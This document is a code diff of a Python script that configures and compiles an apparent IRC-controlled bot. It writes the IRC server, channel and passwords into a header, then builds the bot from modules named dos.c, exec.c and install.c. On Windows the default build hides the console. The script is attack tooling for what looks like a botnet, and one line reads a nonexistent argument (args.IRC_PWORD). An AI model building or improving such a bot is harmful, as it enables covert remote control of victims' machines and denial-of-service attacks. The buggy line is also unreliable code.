@@ -17,15 +17,12 @@ if 8==D:
 parser = argparse.ArgumentParser(description="Script to compile bot code.")
 
 parser.add_argument("-s","--server",help="IRC server to connect to.", default="irc.freenode.net")
-parser.add_argument("-r","--port",help="IRC server port.", default=6667)
+parser.add_argument("-r","--port",help="IRC server port.", default="6667")
+parser.add_argument("-w","--ircpassword",help="IRC server password.", default=None)
 parser.add_argument("-c","--channel",help="Channel to join after connecting.", default="#nullbyte")
-parser.add_argument("-u","--username",help="Bot username.", default=defName)
-parser.add_argument("-n","--nickname",help="Bot nickname.", default=defName)
-parser.add_argument("-p","--password",help="Bot password.", default=None)
-parser.add_argument("-a","--admins",help="Comma separated list of admins.", default="dontrustme")
+parser.add_argument("-p","--password",help="Bot password.", default="test123")
+parser.add_argument("--windowed",help="Show console when running program", default=False, action='store_true')
 parser.add_argument("-v","--verbosity",help="Increase verbosity.", default=False, action='store_true')
-parser.add_argument("--nodelete",help="Do not delete temporary header file.", default=False, action='store_true')
-parser.add_argument("--1337",help="L33T.", default=False, action='store_true')
 
 args = parser.parse_args()
 
@@ -33,8 +30,6 @@ args = parser.parse_args()
 if args.verbosity:
 	for arg in vars(args):
 		print(arg+" = "+str(getattr(args, arg)))
-elif args.username == defName: #Or just print username if it's default/random
-	print("Username: "+args.username)
 		
 #Open the file and read it.
 with open("./temp.h","w") as modifiedfile:
@@ -49,40 +44,27 @@ with open("./temp.h","w") as modifiedfile:
 			elif "#define PORT" in line:
 				if args.verbosity:
 					print("Changed port")
-				modifiedfile.write("#define PORT\t"+str(args.port)+"\n")
+				modifiedfile.write("#define PORT\t"+'"'+args.port+'"'+"\n")
 			elif "#define CHANNEL" in line:
 				if args.verbosity:
 					print("Changed channel")
 				modifiedfile.write("#define CHANNEL\t"+'"'+args.channel+'"\n')
-			elif "#define U_NAME" in line:
-				if args.verbosity:
-					print("Changed username")
-				modifiedfile.write("#define U_NAME\t"+'"'+args.username+'"\n')
-			elif "#define N_NAME" in line:
-				if args.verbosity:
-					print("Changed nickname")
-				modifiedfile.write("#define N_NAME\t"+'"'+args.nickname+'"\n')
-			elif "#define PWORD" in line and args.password:
+			elif "#define BOT_PWORD" in line:
 				if args.verbosity:
 					print("Changed password")
-				modifiedfile.write("#define PWORD\t"+'"'+args.password+'"\n')
-			elif "#define PWORD" in line and not args.password:
-				modifiedfile.write("#define PWORD\tNULL\n")
-			#if "extern" in line: #admins would go here
-			#	modifiedfile.write("#define SERVER\t"+args.server)
+				modifiedfile.write("#define BOT_PWORD\t"+'"'+args.password+'"\n')
+			elif "#define IRC_PWORD" in line and args.ircpassword:
+				modifiedfile.write("#define IRC_PWORD\t"+args.IRC_PWORD+"\n")
 			else: #Just write the line if it's not supposed to be modified
 				modifiedfile.write(line)
 
-#Now compile using temp.h:
-sys.stdout.write("Compiling to file 'bot'...")
-sys.stdout.flush() #Neatly output Compiling...Done
-os.system("gcc -Wall -Werror -O -o bot bot.c temp.h init.c recv.c dos.c exec.c -lpthread")
-print("Done")
-#...and delete it:
-if not args.nodelete:
-	if platform.system() == 'Windows':
-		os.system("del temp.h")
+if platform.system() == "Windows":
+	os.system("move temp.h bot.h")
+	if args.windowed:
+		os.system("gcc -Wall -Werror -O -o bot bot.c init.c recv.c exec.c dos.c install.c -lws2_32")
 	else:
-		os.system("rm temp.h")
-	if args.verbosity:
-		print("Removed temporary file")
+		os.system("gcc -Wall -Werror -O -mwindows -o bot bot.c init.c recv.c exec.c dos.c install.c -lws2_32")
+else:
+	os.system("mv temp.h bot.h")
+	os.system("gcc -Wall -Werror -O -o bot *.c -lpthread")
+print("Done")
